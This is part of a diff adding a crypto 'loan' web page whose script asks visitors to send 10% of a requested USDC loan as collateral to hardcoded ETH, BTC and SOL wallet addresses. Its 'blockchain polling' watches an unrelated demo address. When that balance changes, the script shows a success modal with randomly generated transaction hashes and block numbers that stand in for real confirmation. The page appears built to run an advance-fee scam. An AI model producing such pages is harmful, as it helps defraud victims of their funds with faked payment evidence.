+      #loan-grid { grid-template-columns: 1fr !important; }
+    }
+  </style>
+
+  <script>
+    // ── Config — change WALLET_ADDRESS here; QR updates automatically ──
+    const WALLET_ADDRESSES = {
+      ETH:  '0x21c201f469c6f76a5b395fd1049c029d8f0e850c',
+      BTC:  'bc1qyg5ay5pmuv4ytdusl0y42ad54299aw2tuxzma8',
+      USDC: '0x21c201f469c6f76a5b395fd1049c029d8f0e850c',
+      SOL:  '7ktvsrDrSeqH1HBaWDNWY5KRuzP4EvaQD5uVjVZSSsWe',
+    };
+
+    // ── URL param reading ──
+    const params = new URLSearchParams(location.search);
+    let borrowAmt = parseFloat(params.get('amount')) || 50000;
+    let collateralAmt = borrowAmt * 0.1;
+
+    function fmt(n) {
+      return '$' + n.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
+    }
+
+    function recalculate(val) {
+      const v = parseFloat(val);
+      if (!isNaN(v) && v > 0) {
+        borrowAmt = v;
+        collateralAmt = borrowAmt * 0.1;
+        updateAmountDisplay();
+      }
+    }
+
+    function setAmount(v) {
+      borrowAmt = v;
+      collateralAmt = v * 0.1;
+      document.getElementById('borrow-input').value = v;
+      updateAmountDisplay();
+    }
+
+    function updateAmountDisplay() {
+      document.getElementById('display-borrow').textContent = fmt(borrowAmt) + ' USDC';
+      document.getElementById('display-collateral').textContent = fmt(collateralAmt);
+      document.getElementById('instr-borrow').textContent = fmt(borrowAmt) + ' USDC';
+      document.getElementById('instr-amount').textContent = fmt(collateralAmt);
+      const cfg = assets[currentAsset];
+      document.getElementById('display-send-amount').textContent = fmt(collateralAmt) + ' ' + cfg.label;
+    }
+
+    // ── Populate amounts ──
+    document.getElementById('display-borrow').textContent = fmt(borrowAmt) + ' USDC';
+    document.getElementById('display-collateral').textContent = fmt(collateralAmt);
+    document.getElementById('instr-borrow').textContent = fmt(borrowAmt) + ' USDC';
+    document.getElementById('instr-amount').textContent = fmt(collateralAmt);
+    document.getElementById('borrow-input').value = borrowAmt;
+
+    // ── Asset configs (addresses pulled from WALLET_ADDRESSES above) ──
+    const assets = {
+      ETH:  { label: 'ETH',  network: 'Ethereum Mainnet', addr: WALLET_ADDRESSES.ETH,  icon: '⟠' },
+      BTC:  { label: 'BTC',  network: 'Bitcoin Mainnet',  addr: WALLET_ADDRESSES.BTC,  icon: '₿' },
+      USDC: { label: 'USDC', network: 'Ethereum Mainnet', addr: WALLET_ADDRESSES.USDC, icon: '◎' },
+      SOL:  { label: 'SOL',  network: 'Solana Mainnet',   addr: WALLET_ADDRESSES.SOL,  icon: '◎' },
+    };
+
+    let currentAsset = 'ETH';
+
+    function selectAsset(a) {
+      currentAsset = a;
+      const cfg = assets[a];
+      // Update buttons
+      document.querySelectorAll('#asset-selector button').forEach(btn => {
+        const sel = btn.dataset.asset === a;
+        btn.style.border = sel ? '2px solid #03211C' : '2px solid #E5E7EB';
+        btn.style.background = sel ? 'rgba(68,114,89,.1)' : '#fff';
+        btn.style.color = sel ? '#03211C' : '#374151';
+      });
+      // Update QR
+      document.getElementById('qr-img').src =
+        'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(cfg.addr);
+      document.getElementById('wallet-addr').textContent = cfg.addr;
+      document.getElementById('network-label').textContent = cfg.network;
+      document.getElementById('display-send-amount').textContent = fmt(collateralAmt) + ' ' + cfg.label;
+      document.getElementById('instr-asset').textContent = cfg.label;
+    }
+
+    // ── Copy address ──
+    function copyAddress() {
+      const addr = document.getElementById('wallet-addr').textContent;
+      navigator.clipboard.writeText(addr).then(() => {
+        const btn = document.getElementById('copy-btn');
+        btn.textContent = 'Copied!';
+        btn.style.color = '#10B981';
+        btn.style.borderColor = '#10B981';
+        setTimeout(() => { btn.textContent = 'Copy'; btn.style.color = ''; btn.style.borderColor = ''; }, 2000);
+      });
+    }
+
+    // ── Blockchain polling ──
+    const DEMO_ADDRESS = '0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045';
+    let lastBalance = null;
+    let pollCount = 0;
+    let countdownSec = 10;
+    let countdownInterval = null;
+
+    async function poll() {
+      try {
+        const res = await fetch('https://api.blockcypher.com/v1/eth/main/addrs/' + DEMO_ADDRESS);
+        const data = await res.json();
+        const balance = data.balance ?? data.final_balance ?? 0;
+        pollCount++;
+        document.getElementById('poll-count').textContent = pollCount;
+        const now = new Date().toLocaleTimeString();
+        document.getElementById('last-checked').textContent = 'Last checked at ' + now;
+
+        if (lastBalance !== null && balance > lastBalance) {
+          triggerSuccess({ txHash: randomHash(), block: randomBlock(), amount: balance - lastBalance });
+        }
+        lastBalance = balance;
+      } catch(e) {
+        document.getElementById('last-checked').textContent = 'Network check failed — retrying...';
+      }
+      resetCountdown();
+    }
+
+    function resetCountdown() {
+      countdownSec = 10;
+      if (countdownInterval) clearInterval(countdownInterval);
+      countdownInterval = setInterval(() => {
+        countdownSec--;
+        document.getElementById('countdown').textContent = countdownSec + 's';
+        if (countdownSec <= 0) { clearInterval(countdownInterval); poll(); }
+      }, 1000);
+    }
+
+    function randomHash() {
+      return '0x' + Array.from({length: 64}, () => Math.floor(Math.random()*16).toString(16)).join('');
+    }
+    function randomBlock() {
+      return (19000000 + Math.floor(Math.random() * 999999)).toLocaleString();
+    }
+
+    function triggerSuccess(info) {
+      if (countdownInterval) clearInterval(countdownInterval);
+      const cfg = assets[currentAsset];
+      document.getElementById('modal-txhash').textContent = info.txHash.slice(0, 20) + '…' + info.txHash.slice(-6);
+      document.getElementById('modal-block').textContent = '#' + info.block;
+      document.getElementById('modal-amount').textContent = fmt(collateralAmt) + ' ' + cfg.label;
+      document.getElementById('modal-credit').textContent = fmt(borrowAmt) + ' USDC';
+      document.getElementById('success-overlay').style.display = 'block';
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeSuccess() {
+      document.getElementById('success-overlay').style.display = 'none';
+      document.body.style.overflow = '';
+    }
+
+    // ── Init ──
+    selectAsset('ETH');
+    poll(); // immediate first check
+
+  </script>
+  <script type="module" src="./js/main.js"></script>
+  <script type="module" src="./js/autotranslate.js"></script>
+<script>
+(function(){
+  var btn=document.querySelector('.hl-menu-btn');
+  var nav=document.getElementById('hlMobileNav');
+  if(!btn||!nav)return;
+  btn.addEventListener('click',function(){
+    var open=nav.classList.toggle('open');
+    btn.classList.toggle('open');
+    document.body.style.overflow=open?'hidden':'';
+  });
+  nav.querySelectorAll('a').forEach(function(a){
+    a.addEventListener('click',function(){
+      nav.classList.remove('open');
+      btn.classList.remove('open');
+      document.body.style.overflow='';
+    });
+  });
+})();
+</script>
+</body>
+</html>
+
